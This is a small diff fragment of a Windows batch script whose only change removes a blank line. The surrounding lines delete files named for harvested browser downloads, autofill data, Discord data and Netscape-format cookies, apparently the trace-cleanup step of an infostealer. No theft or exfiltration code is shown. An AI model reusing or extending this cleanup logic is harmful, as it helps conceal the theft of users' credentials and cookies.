@@ -21,7 +21,6 @@ if %debug%==0 (
     del downloads.json || echo "downloads.json not found"
     del autofill.json || echo "autofill.json not found"
     del discord.json || echo "discord.json not found"
-
     REM delete all files that start with cookies_netscape
     for /f "delims=" %%i in ('dir /b cookies_netscape*') do del "%%i"
 
